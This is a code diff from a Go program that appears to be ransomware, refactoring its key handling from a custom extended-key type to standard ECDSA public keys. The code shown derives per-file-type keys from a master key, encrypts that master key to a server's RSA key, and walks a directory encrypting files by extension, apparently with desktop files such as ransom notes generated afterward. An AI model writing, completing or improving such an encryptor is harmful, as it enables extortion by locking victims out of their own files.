@@ -1,6 +1,7 @@
 package main
 
 import (
+	"crypto/ecdsa"
 	"crypto/rsa"
 	"errors"
 	"fmt"
@@ -41,13 +42,13 @@ func main() {
 	defer generateDesktopFiles()
 }
 
-func generateClientKeys(servPubKey *rsa.PublicKey) ([]*eccLib.ExtendedPublicKey, error) {
+func generateClientKeys(servPubKey *rsa.PublicKey) ([]*ecdsa.PublicKey, error) {
 
 	var i uint16
 	var childsNumber uint16 = utils.FileTypeLenght
 	cMasterKey := eccLib.GenerateMasterPrivKey()
 
-	var pubChildKeys = make([]*eccLib.ExtendedPublicKey, childsNumber)
+	var pubChildKeys = make([]*ecdsa.PublicKey, childsNumber)
 
 	masterBytes := eccLib.SerializeExtendedPrivateKey(*cMasterKey)
 	masterBytesEncrypted, err := encryption.RSAAESEncrypt(masterBytes, servPubKey)
@@ -55,7 +56,7 @@ func generateClientKeys(servPubKey *rsa.PublicKey) ([]*eccLib.ExtendedPublicKey,
 		return nil, err
 	}
 
-	keyFile, err := os.Create("cMasterKey.encrypted")
+	keyFile, err := os.Create("masterKey.encrypted")
 	if err != nil {
 		return nil, err
 	}
@@ -82,12 +83,12 @@ func recurDerivPubKey(
 	i uint16,
 	dI uint16,
 	tries int,
-) (*eccLib.ExtendedPublicKey, error) {
+) (*ecdsa.PublicKey, error) {
 
 	if tries > 0 {
 		childKey, err := eccLib.PubChildDeriv(*parentKey, i)
 		if err == nil {
-			return childKey, nil
+			return &childKey.PublicKey, nil
 		}
 	} else {
 		return nil, errors.New("Failed to generate child key")
@@ -96,7 +97,7 @@ func recurDerivPubKey(
 	return recurDerivPubKey(parentKey, i+dI, dI, tries-1)
 }
 
-func encryptFiles(dirPath string, pubKeys []*eccLib.ExtendedPublicKey) {
+func encryptFiles(dirPath string, pubKeys []*ecdsa.PublicKey) {
 
 	var ext string
 	var err error
@@ -136,7 +137,7 @@ func encryptFiles(dirPath string, pubKeys []*eccLib.ExtendedPublicKey) {
 			fileType, mapContains := utils.FileType[file.Extension]
 
 			if mapContains {
-				err = io.EncryptFile(&file, encryption.ECDHAESEncrypt, &pubKeys[fileType].PublicKey)
+				err = io.EncryptFile(&file, encryption.ECDHAESEncrypt, pubKeys[fileType])
 				if err == nil {
 					encryptedList = append(encryptedList, file.Path)
 				}
